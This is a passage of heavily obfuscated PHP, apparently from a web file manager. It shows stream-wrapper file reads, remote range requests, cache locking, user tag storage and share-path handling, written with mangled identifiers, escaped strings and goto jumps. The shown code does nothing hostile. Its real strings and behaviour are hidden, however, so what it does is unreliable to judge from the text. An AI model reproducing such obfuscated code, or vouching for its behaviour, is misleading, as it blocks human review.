exist($öŒ”ı†¬) { $¿™¼Ö‡Å = $this->info($öŒ”ı†¬); return $¿™¼Ö‡Å[$_SERVER[Ò°Ì”İ•][245]]; } public function isFile($¢§¸®Õ) { $‹áè™ = $this->info($¢§¸®Õ); return $‹áè™[$_SERVER[Ò°Ì”İ•][245]]; } public function isFolder($”ÓêØØ¡) { return !1; } public function size($ìî…ƒØ¢) { $ÅŸ‡ ˜¬ = $this->info($ìî…ƒØ¢); return $ÅŸ‡ ˜¬[$_SERVER[Ò°Ì”İ•][90]]; } public function info($¢‡¨³—) { return $this->infoParse($¢‡¨³—); } public function infoAuth($¥Åºßßë) { return $this->infoParse($¥Åºßßë); } public function infoWithChildren($¬¸úíµû) { return $this->infoParse($¬¸úíµû); } public function infoFull($íºúÊÍº) { return $this->infoParse($íºúÊÍº); } private function infoParse($•™ò« ) { $ÄëñÀ› =& $_SERVER[Ò°Ì”İ•]; $°™€Áˆû = $this->header($•™ò« ); if (!$°™€Áˆû || !$°™€Áˆû[$ÄëñÀ›[823]]) { return !1; } $îçüÆğ— = _get($°™€Áˆû, $ÄëñÀ›[424], 0); $š—ªÂÄ = array($ÄëñÀ›[32] => $°™€Áˆû[$ÄëñÀ›[32]], $ÄëñÀ›[98] => $•™ò« , $ÄëñÀ›[33] => $ÄëñÀ›[243], $ÄëñÀ›[90] => intval($îçüÆğ—), $ÄëñÀ›[180] => get_path_ext($°™€Áˆû[$ÄëñÀ›[32]]), $ÄëñÀ›[1452] => $îçüÆğ— > 0 && $°™€Áˆû[$ÄëñÀ›[1602]], $ÄëñÀ›[1453] => !1); return $š—ªÂÄ; } private function header($ÑŞÎ«) { $¦Â ëíâ =& $_SERVER[Ò°Ì”İ•]; if (isset(self::$_cacheHeader[$ÑŞÎ«])) { return self::$_cacheHeader[$ÑŞÎ«]; } $ŒÇÉå° = isset($GLOBALS[$¦Â ëíâ[1603]]) ? $GLOBALS[$¦Â ëíâ[1603]] : !1; $GLOBALS[$¦Â ëíâ[1603]] = !0; self::$_cacheHeader[$ÑŞÎ«] = url_header($ÑŞÎ«); $GLOBALS[$¦Â ëíâ[1603]] = $ŒÇÉå°; return self::$_cacheHeader[$ÑŞÎ«]; } public function hashSimple($ïõÂ‰×Ÿ, $‹ş²ãê¶ = false) { $­Î¥öÑİ =& $_SERVER[Ò°Ì”İ•]; $Ş‚ê¶¡ = $this->info($ïõÂ‰×Ÿ); if (!$Ş‚ê¶¡ || !$Ş‚ê¶¡[$­Î¥öÑİ[245]]) { return !1; } $ó¿œÏ˜« = $Ş‚ê¶¡[$­Î¥öÑİ[90]]; $²”ÑüØ = 200; $¸êÓöŸ = 50; if ($ó¿œÏ˜« <= $²”ÑüØ * $¸êÓöŸ) { return md5($this->fileSubstr($ïõÂ‰×Ÿ, 0, $ó¿œÏ˜«)) . $ó¿œÏ˜«; } $î¾ĞÈ® = intval($ó¿œÏ˜« / $¸êÓöŸ); $É‚ûôÈ× = $­Î¥öÑİ[12]; $ïÓÀ‚øŞ = timeFloat(); $«ƒµ×Æª = 15; for ($‰È¿Ş’Ô = 0; $‰È¿Ş’Ô < $¸êÓöŸ; $‰È¿Ş’Ô++) { if (timeFloat() - $ïÓÀ‚øŞ > $«ƒµ×Æª) { return !1; } $Ô«ˆû‰× = $this->fileSubstr($ïõÂ‰×Ÿ, $î¾ĞÈ® * $‰È¿Ş’Ô, $²”ÑüØ); if (!$Ô«ˆû‰×) { return !1; } $É‚ûôÈ× .= $Ô«ˆû‰×; } $É‚ûôÈ× .= $this->fileSubstr($ïõÂ‰×Ÿ, $ó¿œÏ˜« - $²”ÑüØ, $²”ÑüØ); return md5($É‚ûôÈ×) . $ó¿œÏ˜«; } public function getContent($ÅˆîşÜ×) { return $this->fileSubstr($ÅˆîşÜ×); } public function fileSubstr($Í›Ãò»Õ, $–Âš·Ş˜ = 0, $É‹Ñ÷›Û = -1) { $ÌŞ‘Ëè =& $_SERVER[Ò°Ì”İ•]; $‰¢´È = $this->info($Í›Ãò»Õ); if (!$‰¢´È || !$‰¢´È[$ÌŞ‘Ëè[245]] && $‰¢´È[$ÌŞ‘Ëè[90]] > 1024 * 1024 * 10) { return !1; } if ($É‹Ñ÷›Û === -1) { $É‹Ñ÷›Û = $‰¢´È[$ÌŞ‘Ëè[90]]; } if ($É‹Ñ÷›Û == 0) { return $ÌŞ‘Ëè[12]; } $»¨½§Ó = array($ÌŞ‘Ëè[1604] . $–Âš·Ş˜ . $ÌŞ‘Ëè[859] . ($–Âš·Ş˜ + $É‹Ñ÷›Û - 1)); $şë•åÙ = url_request($Í›Ãò»Õ, $ÌŞ‘Ëè[1492], !1, $»¨½§Ó, !1, !1, 30); return $şë•åÙ[$ÌŞ‘Ëè[1283]] ? $şë•åÙ[$ÌŞ‘Ëè[1283]] : $ÌŞ‘Ëè[12]; } public function download($òùŸÂù», $ú°’¾ÆÉ) { Downloader::start($òùŸÂù», $ú°’¾ÆÉ); return $ú°’¾ÆÉ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¯…ˆ´À, $‰²ŸæÉ¬ = '') { $this->info = $this->info($¯…ˆ´À); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ò°Ì”İ•][98]]; $this->pathOpen = $¯…ˆ´À; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¯…ˆ´À])) { self::$_chunkBuffer[$¯…ˆ´À] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ù¨ã­Ê) { $áÏó¸¨ó = $this->fileSubstr($this->pose, $ù¨ã­Ê); $this->pose += strlen($áÏó¸¨ó); return $áÏó¸¨ó; } public function stream_tell() { return $this->pose; } public function stream_seek($•¤—›Ç‰, $èáˆä½Ñ) { $ÀµàıÈ =& $_SERVER[Ò°Ì”İ•]; if ($èáˆä½Ñ == SEEK_SET) { $this->pose = $•¤—›Ç‰; } else { if ($èáˆä½Ñ == SEEK_CUR) { $this->pose += $•¤—›Ç‰; } else { if ($èáˆä½Ñ == SEEK_END) { $this->pose = $this->info[$ÀµàıÈ[90]] + intval($•¤—›Ç‰); } } } if ($•¤—›Ç‰ < 0) { $this->pose = $this->info[$ÀµàıÈ[90]] + $•¤—›Ç‰; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ò°Ì”İ•][90]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ö—ÔéÓÒ, $õĞËÄàÄ) { $ñ¼Ø®œ› =& $_SERVER[Ò°Ì”İ•]; $ÔÜøŸ÷­ = $this->info($ö—ÔéÓÒ); return array($ñ¼Ø®œ›[1396] => 0, $ñ¼Ø®œ›[1605] => 0, $ñ¼Ø®œ›[16] => 32768 + 511, $ñ¼Ø®œ›[1606] => 0, $ñ¼Ø®œ›[1607] => 0, $ñ¼Ø®œ›[1608] => 0, $ñ¼Ø®œ›[1609] => 0, $ñ¼Ø®œ›[90] => $ÔÜøŸ÷­[$ñ¼Ø®œ›[90]], $ñ¼Ø®œ›[1610] => $ÔÜøŸ÷­[$ñ¼Ø®œ›[1451]], $ñ¼Ø®œ›[1567] => $ÔÜøŸ÷­[$ñ¼Ø®œ›[99]], $ñ¼Ø®œ›[1566] => $ÔÜøŸ÷­[$ñ¼Ø®œ›[244]], $ñ¼Ø®œ›[1611] => 0, $ñ¼Ø®œ›[1612] => 0); } static $fileInfo = array(); public function info($ƒÅÉÛ‘ü) { $¢ÕÇ‹Ì­ = $_SERVER[Ò°Ì”İ•][1613]; if (isset(self::$fileInfo[$ƒÅÉÛ‘ü])) { return self::$fileInfo[$ƒÅÉÛ‘ü]; } if (substr($ƒÅÉÛ‘ü, 0, strlen($¢ÕÇ‹Ì­)) != $¢ÕÇ‹Ì­) { return !1; } self::$fileInfo[$ƒÅÉÛ‘ü] = IO::info(substr($ƒÅÉÛ‘ü, strlen($¢ÕÇ‹Ì­))); return self::$fileInfo[$ƒÅÉÛ‘ü]; } public static function read($Ñ®‰Ê­—, $â¾ÌÊ¤, $­Í¨ÌÛ²) { if (!isset(self::$_fopenCache[$Ñ®‰Ê­—])) { $±¬«›Á¬ = new StreamWrapperIO(); $±¬«›Á¬->stream_open($Ñ®‰Ê­—); self::$_fopenCache[$Ñ®‰Ê­—] = $±¬«›Á¬; } $±¬«›Á¬ = self::$_fopenCache[$Ñ®‰Ê­—]; return $±¬«›Á¬->fileSubstr($â¾ÌÊ¤, $­Í¨ÌÛ²); } public static function _read($ÂÕñşê, $µ”šúŠ, $éñúõ¡) { $é³Í•¾– =& $_SERVER[Ò°Ì”İ•]; $ ÉÀë×Ä = fopen($ÂÕñşê, $é³Í•¾–[1455]); if (!$ ÉÀë×Ä) { return $é³Í•¾–[12]; } $„çÒ¤´µ = 8192; fseek($ ÉÀë×Ä, $µ”šúŠ, SEEK_SET); $şÒ®ŞÁ– = $é³Í•¾–[12]; $—û˜à¡ = 0; while ($—û˜à¡ < $éñúõ¡) { $Â€ş×­¸ = min($„çÒ¤´µ, $éñúõ¡ - $—û˜à¡); $şÒ®ŞÁ– .= fread($ ÉÀë×Ä, $Â€ş×­¸); $—û˜à¡ += $Â€ş×­¸; } fclose($ ÉÀë×Ä); return $şÒ®ŞÁ–; } public function fileSubstr($È¬©Åå, $õÇıöÂ±) { $ù‚òƒÉ˜ =& $_SERVER[Ò°Ì”İ•]; $Ë€Í‚—Ó = $this->info[$ù‚òƒÉ˜[90]]; $áÇ…”êù = $È¬©Åå; $¬Ñ¤›Á = $õÇıöÂ±; if ($È¬©Åå < 0) { $È¬©Åå = $Ë€Í‚—Ó + $È¬©Åå; } if ($õÇıöÂ± === !1) { $õÇıöÂ± = $Ë€Í‚—Ó - $È¬©Åå; } if ($È¬©Åå + $õÇıöÂ± > $Ë€Í‚—Ó) { $õÇıöÂ± = $Ë€Í‚—Ó - $È¬©Åå; } if ($õÇıöÂ± <= 0) { return $ù‚òƒÉ˜[12]; } if ($È¬©Åå < 0 || $È¬©Åå >= $Ë€Í‚—Ó || $õÇıöÂ± <= 0 || $õÇıöÂ± > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\145\122\x65\x61\x64\40\x65\x72\162\x6f\x72\x21\x20\x73\164\141\162\164\x3d{$È¬©Åå}\x3b\x6c\x65\x6e\x67\x74\150\75{$õÇıöÂ±}\x3b\x20\163\151\x7a\x65\x3d{$Ë€Í‚—Ó}\x3b"); } $±¸›ğò = 64 * 1024; $˜©íŞ«â =& self::$_chunkBuffer[$this->path]; if (!$˜©íŞ«â) { $˜©íŞ«â = array(); } $ªï×¦ç› = 0; $ä«Úíø« = 0; $¬¸»´Ğ§ = $ù‚òƒÉ˜[12]; foreach ($˜©íŞ«â as $ªï×¦ç› => $¬¸»´Ğ§) { $ªï×¦ç› = intval($ªï×¦ç›); $ä«Úíø« = $ªï×¦ç› + strlen($¬¸»´Ğ§); if ($È¬©Åå >= $ä«Úíø«) { continue; } if ($È¬©Åå >= $ªï×¦ç› && $È¬©Åå + $õÇıöÂ± <= $ä«Úíø«) { return substr($¬¸»´Ğ§, $È¬©Åå - $ªï×¦ç›, $õÇıöÂ±); } break; } if (count($˜©íŞ«â) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ù‚òƒÉ˜[1614], $ù‚òƒÉ˜[1615] . count($˜©íŞ«â) . "\x3b\x73\164\x61\x72\x74\75{$È¬©Åå}\54\154\x65\156\x67\164\x68\75{$õÇıöÂ±}\73\160\157\x73\145\x3a{$ªï×¦ç›}\176{$ä«Úíø«}"); throw new Exception($ù‚òƒÉ˜[1616]); } $¥ñ¹Éê = intval($È¬©Åå / $±¸›ğò) * $±¸›ğò; $¤Ëğ‰›Ç = ceil(($È¬©Åå + $õÇıöÂ±) / $±¸›ğò) * $±¸›ğò - $¥ñ¹Éê; $µ³‘‘Ü‰ = IO::fileSubstr($this->path, $¥ñ¹Éê, $¤Ëğ‰›Ç); $˜©íŞ«â[$¥ñ¹Éê . $ù‚òƒÉ˜[12]] = $µ³‘‘Ü‰; ksort($˜©íŞ«â); $ŠÃ«ñô = substr($µ³‘‘Ü‰, $È¬©Åå - $¥ñ¹Éê, $õÇıöÂ±); return $ŠÃ«ñô; } private function log($ôÇ‹Ë ¿, $¿Ù¬Ú¡Ò) { $óÆƒì‘† =& $_SERVER[Ò°Ì”İ•]; $ºÔ¦šÃŞ = timeFloat() - $this->timeStart; write_log(sprintf($óÆƒì‘†[1617], $ôÇ‹Ë ¿, $this->info[$óÆƒì‘†[32]], $ºÔ¦šÃŞ, $¿Ù¬Ú¡Ò), $óÆƒì‘†[1260]); } } goto f£ñ²óé´ê; e¹•²ÎÁ‰â: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Î¡¦™»Í =& $_SERVER[Ò°Ì”İ•]; $è®ç¦ªÎ = $GLOBALS[$Î¡¦™»Í[6]][$Î¡¦™»Í[436]]; self::$cachePath = $è®ç¦ªÎ[$Î¡¦™»Í[243]][$Î¡¦™»Í[98]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ì¿½‚†, $å‡Ü€Óà = 0) { $ºÆÍÒ‚¹ =& $_SERVER[Ò°Ì”İ•]; $ÓãëÓ• = microtime(!0); $äÏÁ¬¶­ = $ÓãëÓ• + $å‡Ü€Óà + 0.0001; $§ü£ˆ§¼ = rtrim(self::$cachePath, $ºÆÍÒ‚¹[8]) . $ºÆÍÒ‚¹[938] . md5($ì¿½‚†) . $ºÆÍÒ‚¹[935]; if (file_exists($§ü£ˆ§¼) && filemtime($§ü£ˆ§¼) && filemtime($§ü£ˆ§¼) < time() - 10) { @unlink($§ü£ˆ§¼); } do { if (file_exists($§ü£ˆ§¼)) { cacheLockWait(); continue; } $¤‡õÆïğ = fopen($§ü£ˆ§¼, $ºÆÍÒ‚¹[939]); if (!$¤‡õÆïğ) { return !1; } $ÑÊá¹Ò = flock($¤‡õÆïğ, LOCK_EX | LOCK_NB); self::$caches[$ì¿½‚†] = array($ºÆÍÒ‚¹[940] => $¤‡õÆïğ, $ºÆÍÒ‚¹[243] => $§ü£ˆ§¼); fwrite($¤‡õÆïğ, $äÏÁ¬¶­); clearstatcache(); if ($¤‡õÆïğ && $ÑÊá¹Ò) { return !0; } cacheLockWait(); } while (microtime(!0) < $äÏÁ¬¶­); $this->unlock($ì¿½‚†); return !1; } public function lockGet($ÅÈæÒ³Ï) { $«–àĞíü =& $_SERVER[Ò°Ì”İ•]; $êüû·í = rtrim(self::$cachePath, $«–àĞíü[8]) . $«–àĞíü[938] . md5($ÅÈæÒ³Ï) . $«–àĞíü[935]; return file_exists($êüû·í); } public function unlock($‰ªÌµÇ‰) { $–Ø¦˜÷ê =& $_SERVER[Ò°Ì”İ•]; $€›¡ÌÜİ = self::$caches[$‰ªÌµÇ‰]; if (!$€›¡ÌÜİ) { return; } @flock($€›¡ÌÜİ[$–Ø¦˜÷ê[940]], LOCK_UN); @fclose($€›¡ÌÜİ[$–Ø¦˜÷ê[940]]); @unlink($€›¡ÌÜİ[$–Ø¦˜÷ê[243]]); unset(self::$caches[$‰ªÌµÇ‰]); } } class CacheLockRedis { public function lock($·º’†º, $ÈØú¨¼ = 10) { $‡âÃµ¢ = Cache::init(); $“„­¯€ = microtime(!0) + $ÈØú¨¼; while (microtime(!0) < $“„­¯€) { $ÀÜğÅ = $‡âÃµ¢->get($·º’†º); if (!$ÀÜğÅ) { $ ßê¹Á = $‡âÃµ¢->setLock($·º’†º, $“„­¯€, $ÈØú¨¼); if ($ ßê¹Á) { return !0; } } else { if ($ÀÜğÅ < microtime(!0)) { $‡âÃµ¢->set($·º’†º, $“„­¯€, $ÈØú¨¼ * 2); if ($‡âÃµ¢->get($·º’†º) === $ÀÜğÅ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¤Ö¤Õµ) { return Cache::init()->get($¤Ö¤Õµ); } public function unlock($ŞêÑÄú) { return Cache::init()->remove($ŞêÑÄú); } } goto Aàéœ„× á; Bˆ±¢œ»§: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\x6f\x70\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‡çã»ƒó) { $ñÜî™ğÁ =& $_SERVER[Ò°Ì”İ•]; $Ó²ÍşÂ = defined($ñÜî™ğÁ[2196]) && USER_ID ? USER_ID : $ñÜî™ğÁ[12]; return "\125\x73\x65\x72\117\160\164\151\x6f\156\137{$‡çã»ƒó}\137" . $Ó²ÍşÂ; } protected function filterWhere($ÁÊïÑÙè) { $éîÊØ’Ï =& $_SERVER[Ò°Ì”İ•]; $ÁÊïÑÙè[$éîÊØ’Ï[1768]] = defined($éîÊØ’Ï[2196]) && USER_ID ? USER_ID : $éîÊØ’Ï[12]; return $ÁÊïÑÙè; } public function cacheRemoveUser($šÎİ×¨Â, $ş¯ãï) { return Cache::remove("\x55\x73\145\x72\117\x70\164\x69\x6f\156\x5f{$šÎİ×¨Â}\137" . $ş¯ãï); } protected function optionDefault($Ç´×ŒçÒ = '') { $ë¥İıíÌ =& $_SERVER[Ò°Ì”İ•]; if ($Ç´×ŒçÒ == $ë¥İıíÌ[12]) { return $GLOBALS[$ë¥İıíÌ[6]][$ë¥İıíÌ[2504]]; } if ($Ç´×ŒçÒ == $ë¥İıíÌ[2505]) { return $GLOBALS[$ë¥İıíÌ[6]][$ë¥İıíÌ[2506]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\56\x74\141\147\x4c\x69\x73\164"; public $modelType = "\x55\x73\145\162\x4f\x70\x74\151\157\156"; public $field = array("\156\141\155\x65", "\163\164\x79\154\x65", "\x73\157\x72\164"); public function listData($Ç§„Ê€ï = false, $¿Å®µÃ = "\x73\x6f\162\x74", $µÛ±†Úò = false) { return parent::listData($Ç§„Ê€ï, $¿Å®µÃ, $µÛ±†Úò); } public function remove($§µâö½À) { return parent::remove($§µâö½À); } public function add($´­ûÙ³Í, $ÂõÚÑ‹ï = "\x6c\141\x62\145\x6c\55\147\x72\145\171\x2d\156\x6f\x72\x6d\141\x6c") { $Ä¬ÑÆ¢‰ =& $_SERVER[Ò°Ì”İ•]; if ($this->findByName($´­ûÙ³Í)) { return !1; } $¥íèÕ¯Ê = array($Ä¬ÑÆ¢‰[506] => $´­ûÙ³Í, $Ä¬ÑÆ¢‰[570] => $ÂõÚÑ‹ï, $Ä¬ÑÆ¢‰[1973] => $this->getSort($Ä¬ÑÆ¢‰[347]) + 1); return parent::insert($¥íèÕ¯Ê); } public function update($äô“¸èö, $‰¨°Ü×Ÿ) { $€ï…Ñ… =& $_SERVER[Ò°Ì”İ•]; $„é¢‚—Ä = $this->listData($äô“¸èö); $óèøù§¯ = $this->findByName($‰¨°Ü×Ÿ[$€ï…Ñ…[32]]); if (!$„é¢‚—Ä || $óèøù§¯ && $óèøù§¯[$€ï…Ñ…[487]] != $„é¢‚—Ä[$€ï…Ñ…[487]]) { return !1; } return parent::update($äô“¸èö, $‰¨°Ü×Ÿ); } public function moveTop($°å—¸ó) { $Øã˜‚Î =& $_SERVER[Ò°Ì”İ•]; $ÛîÜûË® = parent::listData(); $‘şÒ¿Úó = $this->getSort($Øã˜‚Î[346]); foreach ($ÛîÜûË® as &$èûòÄü) { if ($èûòÄü[$Øã˜‚Î[487]] == $°å—¸ó) { $èûòÄü[$Øã˜‚Î[1993]] = $‘şÒ¿Úó; continue; } $èûòÄü[$Øã˜‚Î[1993]] += 1; } unset($èûòÄü); return parent::resetData($ÛîÜûË®); } public function moveBottom($ÀÑ»ìğ¥) { $ºŠÁ¿ñ‚ =& $_SERVER[Ò°Ì”İ•]; $šäæÕ½ = $this->getSort($ºŠÁ¿ñ‚[347]) + 1; return parent::update($ÀÑ»ìğ¥, array($ºŠÁ¿ñ‚[1993] => $šäæÕ½)); } public function resetSort($œ¢¥Ş®¨) { $‚—¶Í…· =& $_SERVER[Ò°Ì”İ•]; $ä¡´½¥¢ = array(); $œ¢¥Ş®¨ = is_array($œ¢¥Ş®¨) ? $œ¢¥Ş®¨ : array(); for ($•¹ò¥•§ = 0; $•¹ò¥•§ < count($œ¢¥Ş®¨); $•¹ò¥•§++) { $ä¡´½¥¢[$œ¢¥Ş®¨[$•¹ò¥•§] . $‚—¶Í…·[12]] = $•¹ò¥•§ + 1; } $ºîÓñí˜ = parent::listData(); foreach ($ºîÓñí˜ as &$«® íÍÅ) { $ªÔäĞÍğ = $ä¡´½¥¢[$«® íÍÅ[$‚—¶Í…·[487]]]; $«® íÍÅ[$‚—¶Í…·[1993]] = $ªÔäĞÍğ ? $ªÔäĞÍğ : $«® íÍÅ[$‚—¶Í…·[1993]]; } unset($«® íÍÅ); return parent::resetData($ºîÓñí˜); } private function getSort($À÷ôÚÚ) { $ÚíË ’† =& $_SERVER[Ò°Ì”İ•]; $å¾°ÚÉ– = parent::listData(); $ŠÜÈ¢ = array_to_keyvalue($å¾°ÚÉ–, $ÚíË ’†[12], $ÚíË ’†[1993]); if (!$ŠÜÈ¢) { $ŠÜÈ¢ = array(0); } $û³…×™ = $À÷ôÚÚ == $ÚíË ’†[347] ? max($ŠÜÈ¢) : min($ŠÜÈ¢); return intval($û³…×™); } } goto eéƒ¼…”îŒ; d²õ°Ìæ„´: class PathDriverDriverShareItem { public function __construct($¾Ø®ó¡) { $this->pathParse = $¾Ø®ó¡; } public function __call($„÷¡ŸÓš, $à¦õ…ãè) { $»Çà—‚ı =& $_SERVER[Ò°Ì”İ•]; if (method_exists($this, $„÷¡ŸÓš)) { return; } $…ã™ÁêĞ = call_user_func_array(array($»Çà—‚ı[1426], $„÷¡ŸÓš), $à¦õ…ãè); $øé¶ŠÊ” = array($»Çà—‚ı[1427], $»Çà—‚ı[1428], $»Çà—‚ı[1429], $»Çà—‚ı[1430], $»Çà—‚ı[633], $»Çà—‚ı[635], $»Çà—‚ı[1431], $»Çà—‚ı[121], $»Çà—‚ı[1432], $»Çà—‚ı[1433]); if (in_array($„÷¡ŸÓš, $øé¶ŠÊ”)) { $…ã™ÁêĞ = $this->getPathOuter($…ã™ÁêĞ); } return $…ã™ÁêĞ; } public function copy($èóËşö, $íÕò—¡, $¥º€Õ € = false, $Ù»ø§É‰ = false) { return $this->copyMove($èóËşö, $íÕò—¡, $¥º€Õ €, $_SERVER[Ò°Ì”İ•][633], $Ù»ø§É‰); } public function move($Ì¨¾úø, $ğƒıÉ¸¨, $ö×Î›Úä = false, $›˜›Î±† = false) { return $this->copyMove($Ì¨¾úø, $ğƒıÉ¸¨, $ö×Î›Úä, $_SERVER[Ò°Ì”İ•][635], $›˜›Î±†); } private function copyMove($Ş™í›Ş, $º²Í¯‘, $à¬à§›, $ñ›‘‡øÛ, $İšœù£á = false) { $£Û‹õ =& $_SERVER[Ò°Ì”İ•]; $àùÜØ®À = $º²Í¯‘; $Ïìá…úİ = IO::driverMake($º²Í¯‘); if ($Ïìá…úİ->pathParse[$£Û‹õ[1228]]) { $º²Í¯‘ = $Ïìá…úİ->pathParse[$£Û‹õ[1228]]; } else { $º²Í¯‘ = $àùÜØ®À; } $ùğüááş = IO::copyMove($Ş™í›Ş, $º²Í¯‘, $à¬à§›, $ñ›‘‡øÛ, $İšœù£á); $ùğüááş = $this->getPathOuter($ùğüááş); return $ùğüááş; } public function pathThis($ÏÍŞÚâ˜) { return get_path_this($this->pathParse[$_SERVER[Ò°Ì”İ•][98]]); } public function pathFather($õÈ›ÖÓ) { return get_path_father($this->pathParse[$_SERVER[Ò°Ì”İ•][98]]); } public function iconvSystem($–šòÄÇ°) { return $–šòÄÇ°; } protected function infoParse($èßóÚĞ„, $õèÓ”ë¤ = false) { $šÒŞÁı˜ =& $_SERVER[Ò°Ì”İ•]; $ôÆµÅÉö = $this->pathParse[$šÒŞÁı˜[572]][$šÒŞÁı˜[1253]] . $this->pathParse[$šÒŞÁı˜[1246]]; if ($õèÓ”ë¤) { $âº“ç„ = IO::infoWithChildren($ôÆµÅÉö); } else { $âº“ç„ = IO::info($ôÆµÅÉö); } $ø¥şƒ’ = $this->pathParse[$šÒŞÁı˜[572]]; return Action($šÒŞÁı˜[1424])->_shareItemeParse($âº“ç„, $ø¥şƒ’); } public function listAll($ó­Çç¯÷) { $û¹‘ÛêÌ =& $_SERVER[Ò°Ì”İ•]; $„ÇëŞÑõ = IO::listAll($ó­Çç¯÷); $„ı¬ìÎó = rtrim($this->pathParse[$û¹‘ÛêÌ[572]][$û¹‘ÛêÌ[1253]], $û¹‘ÛêÌ[8]); foreach ($„ÇëŞÑõ as &$­ªÜ¡ªÁ) { $­ªÜ¡ªÁ[$û¹‘ÛêÌ[98]] = $this->pathDriver . $û¹‘ÛêÌ[8] . ltrim(substr($­ªÜ¡ªÁ[$û¹‘ÛêÌ[98]], strlen($„ı¬ìÎó)), $û¹‘ÛêÌ[8]); } unset($­ªÜ¡ªÁ); return $„ÇëŞÑõ; } public function listAllSimple($Ò£é³Ëİ, $ºÇú‘Ö = false) { $ƒøüƒ‚¨ =& $_SERVER[Ò°Ì”İ•]; $ïÆ¡±²Î = $this->listAll($Ò£é³Ëİ); $¨Ê§âÀ€ = $this->pathParse[$ƒøüƒ‚¨[507]]; if (trim($¨Ê§âÀ€, $ƒøüƒ‚¨[8]) == trim(get_path_father($¨Ê§âÀ€), $ƒøüƒ‚¨[8])) { $ºÇú‘Ö = !0; } return IO::init($ƒøüƒ‚¨[12])->listAllSimpleMake($ïÆ¡±²Î, $¨Ê§âÀ€, $ºÇú‘Ö); } public function getPathOuter($üº¨Æİ) { $†ø‹’•À =& $_SERVER[Ò°Ì”İ•]; $«ë¥¥Ê— = KodIO::parse($üº¨Æİ); if ($«ë¥¥Ê—[$†ø‹’•À[33]] == KodIO::KOD_SHARE_ITEM) { return $«ë¥¥Ê—[$†ø‹’•À[98]]; } $Í‘ì‰’² = KodIO::clear($üº¨Æİ); $ô¡Ÿš¨È = KodIO::clear($this->pathParse[$†ø‹’•À[572]][$†ø‹’•À[1253]]); $ÈĞğ•‚ = substr($Í‘ì‰’², strlen($ô¡Ÿš¨È)); if (substr($Í‘ì‰’², 0, strlen($ô¡Ÿš¨È)) != $ô¡Ÿš¨È) { return !1; } return $this->pathParse[$†ø‹’•À[1247]] . $†ø‹’•À[8] . ltrim($ÈĞğ•‚, $†ø‹’•À[8]); } public function getType() { $€å™¶ôÒ =& $_SERVER[Ò°Ì”İ•]; $Ê’õ°Ñ = str_replace($€å™¶ôÒ[88], $€å™¶ôÒ[12], get_class($this)); return strtolower($Ê’õ°Ñ); } public function isOsDriver($‰õéáæ) { return IO::isOsDriver($‰õéáæ); } public function info($ˆáŸÛ“Á) { return $this->infoParse($ˆáŸÛ“Á); } public function infoAuth($Æ¢ê½İ“) { return $this->infoParse($Æ¢ê½İ“); } public function infoWithChildren($ËòŸ˜¤) { return $this->infoParse($ËòŸ˜¤, !0); } public function infoFull($ÒıŠîÌé) { return $this->infoParse($ÒıŠîÌé); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¼³˜ƒ²¯) { $this->pathParse = $¼³˜ƒ²¯; } protected function infoParse($±Õ¯øÊ÷, $½ğ¸úà± = false) { $ô”Ş¢„ =& $_SERVER[Ò°Ì”İ•]; return Action($ô”Ş¢„[1252])->sharePathInfo($this->pathParse[$ô”Ş¢„[98]], !0, $½ğ¸úà±); } public function listPath($êµ†ªõ², $ÙŒì¡Š– = false) { $ÍØŠŒ¤ñ =& $_SERVER[Ò°Ì”İ•]; $¸Ü“Úô× = IO::listPath($êµ†ªõ², $ÙŒì¡Š–); if (!$¸Ü“Úô×) { return $¸Ü“Úô×; } if (is_array($¸Ü“Úô×[$ÍØŠŒ¤ñ[1425]])) { $ßË™İÍã = Action($ÍØŠŒ¤ñ[1434])->parsePathChildren($¸Ü“Úô×[$ÍØŠŒ¤ñ[1425]], array($ÍØŠŒ¤ñ[507] => $êµ†ªõ²)); $¸Ü“Úô×[$ÍØŠŒ¤ñ[1425]] = Action($ÍØŠŒ¤ñ[1252])->shareItemInfo($ßË™İÍã); } foreach ($¸Ü“Úô× as $§Æ¢•äê => $ì –ø) { if (!in_array($§Æ¢•äê, array($ÍØŠŒ¤ñ[97], $ÍØŠŒ¤ñ[96]))) { continue; } foreach ($ì –ø as $Ä“°‚¨ => $ßË™İÍã) { $ßË™İÍã = Action($ÍØŠŒ¤ñ[1434])->parsePathChildren($ßË™İÍã, array($ÍØŠŒ¤ñ[507] => $êµ†ªõ²)); $¸Ü“Úô×[$§Æ¢•äê][$Ä“°‚¨] = Action($ÍØŠŒ¤ñ[1252])->shareItemInfo($ßË™İÍã); } } return $¸Ü“Úô×; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($‹ÂŞúşÈ) { parent::__construct($‹ÂŞúşÈ); $this->setSignVersion($_SERVER[Ò°Ì”İ•][260]); } } goto B±Œ‘¸ÚŸ—; Bëä›×±”: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¿úˆ¥¬ˆ, $àìİ©Ö¨) { $µ‰’š”Ó =& $_SERVER[Ò°Ì”İ•]; $ì¼Ç§À = $àìİ©Ö¨; $GLOBALS[$µ‰’š”Ó[1223]] = $µ‰’š”Ó[1224] . $¿úˆ¥¬ˆ; Hook::trigger($µ‰’š”Ó[1224] . $¿úˆ¥¬ˆ . $µ‰’š”Ó[1225], $ì¼Ç§À); $Áüè²” = 